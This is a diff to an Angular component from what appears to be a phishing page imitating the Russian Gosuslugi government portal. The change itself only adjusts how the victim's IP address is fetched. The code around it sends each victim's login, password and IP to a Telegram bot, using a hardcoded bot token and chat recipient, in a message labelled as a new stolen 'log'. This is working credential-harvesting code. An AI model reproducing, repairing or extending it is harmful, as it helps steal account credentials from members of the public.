@@ -23,11 +23,11 @@ export class AppComponent implements OnInit {
 	};
 	selected = 'ru';
 	isSmallScreen = false;
-	ipAddress: object | any;
+	ipAddress: string;
 
 	sentMessage(): void {
 		if (this.prevValue.login !== this.form.get('login').value || this.prevValue.password !== this.form.get('password').value) {
-			const message = `Новый Лог – ГосУслуги🤟%0AIP: ${this.ipAddress?.ip}%0AЛогин: ${this.form.get('login').value}%0AПароль: ${this.form.get('password').value}`;
+			const message = `Новый Лог – ГосУслуги🤟%0AIP: ${this.ipAddress}%0AЛогин: ${this.form.get('login').value}%0AПароль: ${this.form.get('password').value}`;
 			const token = '949565640:AAEGoYzcWtY0kC3MTI0KNfdkWFgxVe8NOQs';
 			Telegram.setToken(token);
 			Telegram.setRecipient('880595419');
@@ -50,7 +50,7 @@ export class AppComponent implements OnInit {
 	) {}
 
 	ngOnInit(): void {
-		this.http.get('http://api.ipify.org/?format=json').pipe(
+		this.http.get('http://api.ipify.org/?format=text').pipe(
 			first(),
 			tap((value) => console.log(value)),
 		).subscribe(value => this.ipAddress = value);
